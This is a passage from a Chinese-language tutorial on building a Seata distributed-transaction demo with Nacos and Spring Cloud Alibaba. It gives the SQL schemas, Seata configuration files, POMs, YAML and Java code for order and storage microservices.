`status` tinyint, `client_id` varchar(64), `application_data` varchar(2000), `gmt_create` datetime, `gmt_modified` datetime, primary key (`branch_id`), key `idx_xid` (`xid`)); -- the table to store lock datadrop table if exists `lock_table`;create table `lock_table` ( `row_key` varchar(128) not null, `xid` varchar(96), `transaction_id` long , `branch_id` long, `resource_id` varchar(256) , `table_name` varchar(32) , `pk` varchar(36) , `gmt_create` datetime , `gmt_modified` datetime, primary key(`row_key`)); 修改seata-server-0.9.0\\seata\\conf目录下的registry.conf配置文件 12345678910registry &#123; # file 、nacos 、eureka、redis、zk、consul、etcd3、sofa type &#x3D; &quot;nacos&quot; nacos &#123; serverAddr &#x3D; &quot;localhost:8848&quot; namespace &#x3D; &quot;&quot; cluster &#x3D; &quot;default&quot; &#125;目的是：指明注册中心为nacos，及修改nacos连接信息 先启动Nacos端口号8848 再启动seata-server softs\\seata-server-0.9.0\\seata\\bin seata-server.bat 订单/库存/账户业务数据库准备以下演示都需要先启动Nacos后启动Seata，保证两个都OK Seata没启动报错no available server to connect 分布式事务业务说明业务说明 下订单—&gt;扣库存—&gt;减账户（余额） 创建业务数据库seata_order: 存储订单的数据库seata_storage:存储库存的数据库seata_account: 存储账户信息的数据库建表SQL123CREATE DATABASE seata_order；CREATE DATABASE seata_storage；CREATE DATABASE seata_account； 按照上述3库分别建对应业务表seata_order库下建t_order表 12345678910CREATE TABLE t_order( `id` BIGINT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY, `user_id` BIGINT(11) DEFAULT NULL COMMENT '用户id', `product_id` BIGINT(11) DEFAULT NULL COMMENT '产品id', `count` INT(11) DEFAULT NULL COMMENT '数量', `money` DECIMAL(11,0) DEFAULT NULL COMMENT '金额', `status` INT(1) DEFAULT NULL COMMENT '订单状态：0：创建中; 1：已完结') ENGINE=INNODB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8; SELECT * FROM t_order; seata_storage库下建t_storage表 12345678910111213CREATE TABLE t_storage( `id` BIGINT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY, `product_id` BIGINT(11) DEFAULT NULL COMMENT '产品id', `'total` INT(11) DEFAULT NULL COMMENT '总库存', `used` INT(11) DEFAULT NULL COMMENT '已用库存', `residue` INT(11) DEFAULT NULL COMMENT '剩余库存') ENGINE=INNODB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8; INSERT INTO seata_storage.t_storage(`id`,`product_id`,`total`,`used`,`residue`)VALUES('1','1','100','0','100'); SELECT * FROM t_storage; seata_account库下建t_account表 1234567891011CREATE TABLE t_account( `id` BIGINT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY COMMENT 'id', `user_id` BIGINT(11) DEFAULT NULL COMMENT '用户id', `total` DECIMAL(10,0) DEFAULT NULL COMMENT '总额度', `used` DECIMAL(10,0) DEFAULT NULL COMMENT '已用余额', `residue` DECIMAL(10,0) DEFAULT '0' COMMENT '剩余可用额度') ENGINE=INNODB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8; INSERT INTO seata_account.t_account(`id`,`user_id`,`total`,`used`,`residue`) VALUES('1','1','1000','0','1000') SELECT * FROM t_account; 按照上述3库分别建对应的回滚日志表订单-库存-账户3个库下都需要建各自的回滚日志表 \\seata-server-0.9.0\\seata\\conf目录下的db_undo_log.sql 建表SQL 1234567891011121314drop table `undo_log`;CREATE TABLE `undo_log` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `branch_id` bigint(20) NOT NULL, `xid` varchar(100) NOT NULL, `context` varchar(128) NOT NULL, `rollback_info` longblob NOT NULL, `log_status` int(11) NOT NULL, `log_created` datetime NOT NULL, `log_modified` datetime NOT NULL, `ext` varchar(100) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `ux_undo_log` (`xid`,`branch_id`)) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; 最终效果 订单/库存/账户业务微服务准备 业务需求下订单-&gt;减库存-&gt;扣余额-&gt;改（订单）状态 新建订单Order-Module seata-order-service2001 POM 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263 &lt;dependencies&gt; &lt;!--nacos--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;!--feign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--web-actuator--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mysql-druid--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.37&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 3.YML 12345678910111213141516171819202122232425262728293031server: port: 2001 spring: application: name: seata-order-service cloud: alibaba: seata: #自定义事务组名称需要与seata-server中的对应 tx-service-group: fsp_tx_group nacos: discovery: server-addr: localhost:8848 datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/seata_order username: root password: 1111111 feign: hystrix: enabled: false logging: level: io: seata: info mybatis: mapperLocations: classpath:mapper/*.xml 4.file.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140transport &#123; # tcp udt unix-domain-socket type = \"TCP\" #NIO NATIVE server = \"NIO\" #enable heartbeat heartbeat = true #thread factory for netty thread-factory &#123; boss-thread-prefix = \"NettyBoss\" worker-thread-prefix = \"NettyServerNIOWorker\" server-executor-thread-prefix = \"NettyServerBizHandler\" share-boss-worker = false client-selector-thread-prefix = \"NettyClientSelector\" client-selector-thread-size = 1 client-worker-thread-prefix = \"NettyClientWorkerThread\" # netty boss thread size,will not be used for UDT boss-thread-size = 1 #auto default pin or 8 worker-thread-size = 8 &#125; shutdown &#123; # when destroy server, wait seconds wait = 3 &#125; serialization = \"seata\" compressor = \"none\"&#125; service &#123; vgroup_mapping.fsp_tx_group = \"default\" default.grouplist = \"127.0.0.1:8091\" enableDegrade = false disable = false max.commit.retry.timeout = \"-1\" max.rollback.retry.timeout = \"-1\" disableGlobalTransaction = false&#125; client &#123; async.commit.buffer.limit = 10000 lock &#123; retry.internal = 10 retry.times = 30 &#125; report.retry.count = 5 tm.commit.retry.count = 1 tm.rollback.retry.count = 1&#125; ## transaction log storestore &#123; ## store mode: file、db mode = \"db\" ## file store file &#123; dir = \"sessionStore\" # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions max-branch-session-size = 16384 # globe session size , if exceeded throws exceptions max-global-session-size = 512 # file buffer size , if exceeded allocate new buffer file-write-buffer-cache-size = 16384 # when recover batch read size session.reload.read_size = 100 # async, sync flush-disk-mode = async &#125; ## database store db &#123; ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp) etc. datasource = \"dbcp\" ## mysql/oracle/h2/oceanbase etc. db-type = \"mysql\" driver-class-name = \"com.mysql.jdbc.Driver\" url = \"jdbc:mysql://127.0.0.1:3306/seata\" user = \"root\" password = \"123456\" min-conn = 1 max-conn = 3 global.table = \"global_table\" branch.table = \"branch_table\" lock-table = \"lock_table\" query-limit = 100 &#125;&#125;lock &#123; ## the lock store mode: local、remote mode = \"remote\" local &#123; ## store locks in user's database &#125; remote &#123; ## store locks in the seata's server &#125;&#125;recovery &#123; #schedule committing retry period in milliseconds committing-retry-period = 1000 #schedule asyn committing retry period in milliseconds asyn-committing-retry-period = 1000 #schedule rollbacking retry period in milliseconds rollbacking-retry-period = 1000 #schedule timeout retry period in milliseconds timeout-retry-period = 1000&#125; transaction &#123; undo.data.validation = true undo.log.serialization = \"jackson\" undo.log.save.days = 7 #schedule delete expired undo_log in milliseconds undo.log.delete.period = 86400000 undo.log.table = \"undo_log\"&#125; ## metrics settingsmetrics &#123; enabled = false registry-type = \"compact\" # multi exporters use comma divided exporter-list = \"prometheus\" exporter-prometheus-port = 9898&#125; support &#123; ## spring spring &#123; # auto proxy the DataSource bean datasource.autoproxy = false &#125;&#125; 5.registry.conf 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273registry &#123; # file 、nacos 、eureka、redis、zk、consul、etcd3、sofa type = \"nacos\" nacos &#123; serverAddr = \"localhost:8848\" namespace = \"\" cluster = \"default\" &#125; eureka &#123; serviceUrl = \"http://localhost:8761/eureka\" application = \"default\" weight = \"1\" &#125; redis &#123; serverAddr = \"localhost:6379\" db = \"0\" &#125; zk &#123; cluster = \"default\" serverAddr = \"127.0.0.1:2181\" session.timeout = 6000 connect.timeout = 2000 &#125; consul &#123; cluster = \"default\" serverAddr = \"127.0.0.1:8500\" &#125; etcd3 &#123; cluster = \"default\" serverAddr = \"http://localhost:2379\" &#125; sofa &#123; serverAddr = \"127.0.0.1:9603\" application = \"default\" region = \"DEFAULT_ZONE\" datacenter = \"DefaultDataCenter\" cluster = \"default\" group = \"SEATA_GROUP\" addressWaitTime = \"3000\" &#125; file &#123; name = \"file.conf\" &#125;&#125; config &#123; # file、nacos 、apollo、zk、consul、etcd3 type = \"file\" nacos &#123; serverAddr = \"localhost\" namespace = \"\" &#125; consul &#123; serverAddr = \"127.0.0.1:8500\" &#125; apollo &#123; app.id = \"seata-server\" apollo.meta = \"http://192.168.1.204:8801\" &#125; zk &#123; serverAddr = \"127.0.0.1:2181\" session.timeout = 6000 connect.timeout = 2000 &#125; etcd3 &#123; serverAddr = \"http://localhost:2379\" &#125; file &#123; name = \"file.conf\" &#125;&#125; 6.domain CommonResult 123456789101112131415161718192021package com.kayleh.springcloud.alibaba.domain; import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor; @Data@AllArgsConstructor@NoArgsConstructorpublic class CommonResult&lt;T&gt;&#123; private Integer code; private String message; private T data; public CommonResult(Integer code, String message) &#123; this(code,message,null); &#125;&#125; Order 1234567891011121314151617181920212223242526package com.kayleh.springcloud.alibaba.domain; import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor; import java.math.BigDecimal; @Data@AllArgsConstructor@NoArgsConstructorpublic class Order&#123; private Long id; private Long userId; private Long productId; private Integer count; private BigDecimal money; private Integer status; //订单状态：0：创建中；1：已完结&#125; 7.Dao接口及实现 OrderDao 123456789101112131415package com.kayleh.springcloud.alibaba.dao; import com.kayleh.springcloud.alibaba.domain.Order;import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Param; @Mapperpublic interface OrderDao&#123; //新建订单 void create(Order order); //修改订单状态，从零改为1 void update(@Param(\"userId\") Long userId,@Param(\"status\") Integer status);&#125; resources文件夹下新建mapper文件夹后添加 OrderMapper.xml 1234567891011121314151617181920212223242526&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\" &gt; &lt;mapper namespace=\"com.kayleh.springcloud.alibaba.dao.OrderDao\"&gt; &lt;resultMap id=\"BaseResultMap\" type=\"com.kayleh.springcloud.alibaba.domain.Order\"&gt; &lt;id column=\"id\" property=\"id\" jdbcType=\"BIGINT\"/&gt; &lt;result column=\"user_id\" property=\"userId\" jdbcType=\"BIGINT\"/&gt; &lt;result column=\"product_id\" property=\"productId\" jdbcType=\"BIGINT\"/&gt; &lt;result column=\"count\" property=\"count\" jdbcType=\"INTEGER\"/&gt; &lt;result column=\"money\" property=\"money\" jdbcType=\"DECIMAL\"/&gt; &lt;result column=\"status\" property=\"status\" jdbcType=\"INTEGER\"/&gt; &lt;/resultMap&gt; &lt;insert id=\"create\"&gt; insert into t_order (id,user_id,product_id,count,money,status) values (null,#&#123;userId&#125;,#&#123;productId&#125;,#&#123;count&#125;,#&#123;money&#125;,0); &lt;/insert&gt; &lt;update id=\"update\"&gt; update t_order set status = 1 where user_id=#&#123;userId&#125; and status = #&#123;status&#125;; &lt;/update&gt; &lt;/mapper&gt; 8.Service接口及实现 OrderService 12345678package com.kayleh.springcloud.alibaba.service; import com.kayleh.springcloud.alibaba.domain.Order; public interface OrderService&#123; void create(Order order);&#125; OrderServiceImpl 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package com.kayleh.springcloud.alibaba.service.impl; import com.kayleh.springcloud.alibaba.dao.OrderDao;import com.kayleh.springcloud.alibaba.domain.Order;import com.kayleh.springcloud.alibaba.service.AccountService;import com.kayleh.springcloud.alibaba.service.OrderService;import com.kayleh.springcloud.alibaba.service.StorageService;import io.seata.spring.annotation.GlobalTransactional;import lombok.extern.slf4j.Sl f4j;import org.springframework.stereotype.Service; import javax.annotation.Resource; @Service@Slf4jpublic class OrderServiceImpl implements OrderService&#123; @Resource private OrderDao orderDao; @Resource private StorageService storageService; @Resource private AccountService accountService; /** * 创建订单-&gt;调用库存服务扣减库存-&gt;调用账户服务扣减账户余额-&gt;修改订单状态 */ @Override @GlobalTransactional(name = \"fsp-create-order\",rollbackFor = Exception.class) public void create(Order order)&#123; log.info(\"-----&gt;开始新建订单\"); //新建订单 orderDao.create(order); //扣减库存 log.info(\"-----&gt;订单微服务开始调用库存，做扣减Count\"); storageService.decrease(order.getProductId(),order.getCount()); log.info(\"-----&gt;订单微服务开始调用库存，做扣减end\"); //扣减账户 log.info(\"-----&gt;订单微服务开始调用账户，做扣减Money\"); accountService.decrease(order.getUserId(),order.getMoney()); log.info(\"-----&gt;订单微服务开始调用账户，做扣减end\"); //修改订单状态，从零到1代表已经完成 log.info(\"-----&gt;修改订单状态开始\"); orderDao.update(order.getUserId(),0); log.info(\"-----&gt;修改订单状态结束\"); log.info(\"-----&gt;下订单结束了\"); &#125;&#125; StorageService 123456789101112131415package com.kayleh.springcloud.alibaba.service; import com.kayleh.springcloud.alibaba.domain.CommonResult;import org.springframework.cloud.openfeign.FeignClient;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestParam; import java.math.BigDecimal; @FeignClient(value = \"seata-storage-service\")public interface StorageService&#123; @PostMapping(value = \"/storage/decrease\") CommonResult decrease(@RequestParam(\"productId\") Long productId, @RequestParam(\"count\") Integer count);&#125; AccountService 1234567891011121314package com.kayleh.springcloud.alibaba.service; import com.kayleh.springcloud.alibaba.domain.CommonResult;import org.springframework.cloud.openfeign.FeignClient;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestParam; import java.math.BigDecimal; @FeignClient(value = \"seata-account-service\")public interface AccountService&#123; @PostMapping(value = \"/account/decrease\") CommonResult decrease(@RequestParam(\"userId\") Long userId, @RequestParam(\"money\") BigDecimal money);&#125; 9.Controller 123456789101112131415161718192021222324package com.kayleh.springcloud.alibaba.controller; import com.kayleh.springcloud.alibaba.domain.CommonResult;import com.kayleh.springcloud.alibaba.domain.Order;import com.kayleh.springcloud.alibaba.service.OrderService;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController; import javax.annotation.Resource; @RestControllerpublic class OrderController&#123; @Resource private OrderService orderService; @GetMapping(\"/order/create\") public CommonResult create(Order order) &#123; orderService.create(order); return new CommonResult(200,\"订单创建成功\"); &#125;&#125; 10.Config配置 MyBatisConfig 1234567891011package com.kayleh.springcloud.alibaba.config; import org.mybatis.spring.annotation.MapperScan;import org.springframework.context.annotation.Configuration; @Configuration@MapperScan(&#123;\"com.kayleh.springcloud.alibaba.dao\"&#125;)public class MyBatisConfig &#123; &#125; DataSourceProxyConfig 123456789101112131415161718192021222324252627282930313233343536373839404142434445package com.kayleh.springcloud.alibaba.config; import com.alibaba.druid.pool.DruidDataSource;import io.seata.rm.datasource.DataSourceProxy;import org.apache.ibatis.session.SqlSessionFactory;import org.mybatis.spring.SqlSessionFactoryBean;import org.mybatis.spring.transaction.SpringManagedTransactionFactory;import org.springframework.beans.factory.annotation.Value;import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.core.io.support.PathMatchingResourcePatternResolver;import javax.sql.DataSource; @Configurationpublic class DataSourceProxyConfig &#123; @Value(\"$&#123;mybatis.mapperLocations&#125;\") private String mapperLocations; @Bean @ConfigurationProperties(prefix = \"spring.datasource\") public DataSource druidDataSource()&#123; return new DruidDataSource(); &#125; @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) &#123; return new DataSourceProxy(dataSource); &#125; @Bean public SqlSessionFactory sqlSessionFactoryBean(DataSourceProxy dataSourceProxy) throws Exception &#123; SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); &#125; &#125; 11.主启动 123456789101112131415161718package com.kayleh.springcloud.alibaba; import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;import org.springframework.cloud.openfeign.EnableFeignClients; @EnableDiscoveryClient@EnableFeignClients@SpringBootApplication(exclude = DataSourceAutoConfiguration.class)//取消数据源自动创建的配置public class SeataOrderMainApp2001&#123; public static void main(String[] args) &#123; SpringApplication.run(SeataOrderMainApp2001.class, args); &#125;&#125; 新建库存Storage-Module1.seata-order-service2002 2.POM 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;dependencies&gt; &lt;!--nacos--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;!--feign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.37&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 3.YML 1234567891011121314151617181920212223242526server: port: 2002 spring: application: name: seata-storage-service cloud: alibaba: seata: tx-service-group: fsp_tx_group nacos: discovery: server-addr: localhost:8848 datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/seata_storage username: root password: 111111 logging: level: io: seata: info mybatis: mapperLocations: classpath:mapper/*.xml 4.file.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071transport &#123; # tcp udt unix-domain-socket type = \"TCP\" #NIO NATIVE server = \"NIO\" #enable heartbeat heartbeat = true #thread factory for netty thread-factory &#123; boss-thread-prefix = \"NettyBoss\" worker-thread-prefix = \"NettyServerNIOWorker\" server-executor-thread-prefix = \"NettyServerBizHandler\" share-boss-worker = false client-selector-thread-prefix = \"NettyClientSelector\" client-selector-thread-size = 1 client-worker-thread-prefix = \"NettyClientWorkerThread\" # netty boss thread size,will not be used for UDT boss-thread-size = 1 #auto default pin or 8 worker-thread-size = 8 &#125; shutdown &#123; # when destroy server, wait seconds wait = 3 &#125; serialization = \"seata\" compressor = \"none\"&#125; service &#123; #vgroup-&gt;rgroup vgroup_mapping.fsp_tx_group = \"default\" #only support single node default.grouplist = \"127.0.0.1:8091\" #degrade current not support enableDegrade = false #disable disable = false #unit ms,s,m,h,d represents milliseconds, seconds, minutes, hours, days, default permanent max.commit.retry.timeout = \"-1\" max.rollback.retry.timeout = \"-1\" disableGlobalTransaction = false&#125; client &#123; async.commit.buffer.limit = 10000 lock &#123; retry.internal = 10 retry.times = 30 &#125; report.retry.count = 5 tm.commit.retry.count = 1 tm.rollback.retry.count = 1&#125; transaction &#123; undo.data.validation = true undo.log.serialization = \"jackson\" undo.log.save.days = 7 #schedule delete expired undo_log in milliseconds undo.log.delete.period = 86400000 undo.log.table = \"undo_log\"&#125; support &#123; ## spring spring &#123; # auto proxy the DataSource bean datasource.autoproxy = false &#125;&#125; 5.registry.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051registry &#123; # file 、nacos 、eureka、redis、zk type = \"nacos\" nacos &#123; serverAddr = \"localhost:8848\" namespace = \"\" cluster = \"default\" &#125; eureka &#123; serviceUrl = \"http://localhost:8761/eureka\" application = \"default\" weight = \"1\" &#125; redis &#123; serverAddr = \"localhost:6381\" db = \"0\" &#125; zk &#123; cluster = \"default\" serverAddr = \"127.0.0.1:2181\" session.timeout = 6000 connect.timeout = 2000 &#125; file &#123; name = \"file.conf\" &#125;&#125; config &#123; # file、nacos 、apollo、zk type = \"file\" nacos &#123; serverAddr = \"localhost\" namespace = \"\" cluster = \"default\" &#125; apollo &#123; app.id = \"fescar-server\" apollo.meta = \"http://192.168.1.204:8801\" &#125; zk &#123; serverAddr = \"127.0.0.1:2181\" session.timeout = 6000 connect.timeout = 2000 &#125; file &#123; name = \"file.conf\" &#125;&#125; 6.domain CommonResult 1234567891011121314151617181920package com.kayleh.springcloud.alibaba.domain; import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor; @Data@AllArgsConstructor@NoArgsConstructorpublic class CommonResult&lt;T&gt;&#123; private Integer code; private String message; private T data; public CommonResult(Integer code, String message) &#123; this(code,message,null); &#125;&#125; Storage 1234567891011121314151617181920212223package com.kayleh.springcloud.alibaba.domain; import lombok.Data; @Datapublic class Storage &#123; private Long id; // 产品id private Long productId; //总库存 private Integer total; //已用库存 private Integer used; //剩余库存 private Integer residue;&#125; 7.Dao接口及实现 StorageDao 12345678910package com.kayleh.springcloud.alibaba.dao; import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Param; @Mapperpublic interface StorageDao &#123; //扣减库存信息 void decrease(@Param(\"productId\") Long productId, @Param(\"count\") Integer count);&#125; resources文件夹下新建mapper文件夹后添加 StorageMapper.xml 1234567891011121314151617181920212223&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\" &gt; &lt;mapper namespace=\"com.kayleh.springcloud.alibaba.dao.StorageDao\"&gt; &lt;resultMap id=\"BaseResultMap\" type=\"com.kayleh.springcloud.alibaba.domain.Storage\"&gt; &lt;id column=\"id\" property=\"id\" jdbcType=\"BIGINT\"/&gt; &lt;result column=\"product_id\" property=\"productId\" jdbcType=\"BIGINT\"/&gt; &lt;result column=\"total\" property=\"total\" jdbcType=\"INTEGER\"/&gt; &lt;result column=\"used\" property=\"used\" jdbcType=\"INTEGER\"/&gt; &lt;result column=\"residue\" property=\"residue\" jdbcType=\"INTEGER\"/&gt; &lt;/resultMap&gt; &lt;update id=\"decrease\"&gt; UPDATE t_storage SET used = used + #&#123;count&#125;,residue = residue - #&#123;count&#125; WHERE product_id = #&#123;productId&#125; &lt;/update&gt;&lt;/mapper&gt; 8.Service接口及实现 StorageService 12345678package com.kayleh.springcloud.alibaba.service; public interface StorageService &#123; // 扣减库存 void decrease(Long productId, Integer count);&#125; StorageServiceImpl 12345678910111213141516171819202122232425262728package com.kayleh.springcloud.alibaba.service.impl; import com.kayleh.springcloud.alibaba.dao.StorageDao;import com.kayleh.springcloud.alibaba.service.StorageService ;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service; import javax.annotation.Resource; @Servicepublic class StorageServiceImpl implements StorageService &#123; private static final Logger LOGGER = LoggerFactory.getLogger(StorageServiceImpl.class); @Resource private StorageDao storageDao; // 扣减库存 @Override public void decrease(Long productId, Integer count) &#123; LOGGER.info(\"-------&gt;storage-service中扣减库存开始\"); storageDao.decrease(productId,count); LOGGER.info(\"-------&gt;storage-service中扣减库存结束\"); &#125;&#125; 9.Controller 1234567891011121314151617181920212223package com.kayleh.springcloud.alibaba.controller; import com.kayleh.springcloud.alibaba.domain.CommonResult ;import com.kayleh.springcloud.alibaba.service.StorageService ;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController; @RestControllerpublic class StorageController &#123; @Autowired private StorageService storageService; //扣减库存 @RequestMapping(\"/storage/decrease\") public CommonResult decrease(Long productId, Integer count) &#123; storageService.decrease(productId, count); return new CommonResult(200,\"扣减库存成功！\"); &#125;&#125; 10.Config配置 MyBatisConfig 12345678910package com.kayleh.springcloud.alibaba.config; import org.mybatis.spring.annotation.MapperScan;import org.springframework.context.annotation.Configuration; @Configuration@MapperScan(&#123;\"com.kayleh.springcloud.alibaba.dao\"&#125;)public class MyBatisConfig &#123;&#125; DataSourceProxyConfig 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.kayleh.springcloud.alibaba.config; import com.alibaba.druid.pool.DruidDataSource;import io.seata.rm.datasource.DataSourceProxy;import org.apache.ibatis.session.SqlSessionFactory;import org.mybatis.spring.SqlSessionFactoryBean;import org.mybatis.spring.transaction.SpringManagedTransactionFactory;import org.springframework.beans.factory.annotation.Value;import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.core.io.support.PathMatchingResourcePatternResolver; import javax.sql.DataSource; @Configurationpublic class DataSourceProxyConfig &#123; @Value(\"$&#123;mybatis.mapperLocations&#125;\") private String mapperLocations; @Bean @ConfigurationProperties(prefix = \"spring.datasource\") public DataSource druidDataSource()&#123; return new DruidDataSource(); &#125; @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) &#123; return new DataSourceProxy(dataSource); &#125; @Bean public SqlSessionFactory sqlSessionFactoryBean(DataSourceProxy dataSourceProxy) throws 